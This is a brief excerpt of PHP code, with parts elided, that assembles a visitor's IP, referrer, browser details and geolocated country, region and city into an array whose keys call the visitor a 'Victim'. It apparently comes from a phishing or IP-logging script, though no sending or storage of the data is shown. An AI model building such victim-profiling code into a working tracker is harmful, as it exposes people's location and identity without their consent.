...
$data = [
    ...
    'Victim IP' => $clientIP,
    'Victim Comes From' => $_SERVER['HTTP_REFERER'] ?? null,
    'Victim Details' => $_SERVER['HTTP_USER_AGENT'] ?? null,
    'Server Name' => $_SERVER['SERVER_NAME'] ?? null,
    'Server IP' => $_SERVER['SERVER_ADDR'] ?? null,
    'User Country' => $geoDetails['country'] ?? null,
    'User Region' => $geoDetails['region'] ?? null,
    'User City' => $geoDetails['city'] ?? null,
];
